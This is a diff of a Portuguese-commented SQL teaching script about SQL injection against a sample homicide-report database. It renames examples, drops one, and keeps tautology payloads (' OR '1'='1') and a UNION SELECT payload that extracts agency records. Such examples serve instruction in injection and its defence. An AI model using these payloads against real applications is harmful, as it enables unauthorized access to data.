@@ -16,7 +16,7 @@
 USE HomicideDB;
 
 SELECT * FROM HomicideReport;
--- Exemplo Simples de SQL Injection
+-- Exemplo 1 de SQL Injection
 -- Suponha que a aplicação execute a seguinte consulta para buscar relatórios de homicídios por cidade
 SELECT * FROM HomicideReport WHERE City = 'Anchorage';
 -- Um invasor pode usar ' OR '1'='1' -- no campo cidade
@@ -24,15 +24,7 @@ SELECT * FROM HomicideReport WHERE City = 'Anchorage';
 SELECT * FROM HomicideReport WHERE City = '' OR '1'='1';
 -- Isso retornará todos os registros da tabela HomicideReport
 
--- Exemplo Médio de SQL Injection
--- Suponha que a aplicação execute a seguinte consulta para obter detalhes de um relatório específico
-SELECT * FROM HomicideReport WHERE RecordID = '2';
--- Um invasor pode usar 1 OR 1=1 no campo RecordID
--- A consulta resultante será:
-SELECT * FROM HomicideReport WHERE RecordID = 1 OR 1=1;
--- Isso retornará todos os registros da tabela HomicideReport
-
--- Exemplo Muito Complexo de SQL Injection
+-- Exemplo 2 de SQL Injection
 -- Suponha que a aplicação execute a seguinte consulta para obter detalhes de um relatório específico
 SELECT * FROM HomicideReport WHERE RecordID = '2';
 -- Um invasor pode usar 1 UNION SELECT AgencyCode, AgencyName, AgencyType, null, null, null, null, null, null, null, null, null, null, null FROM Agency --
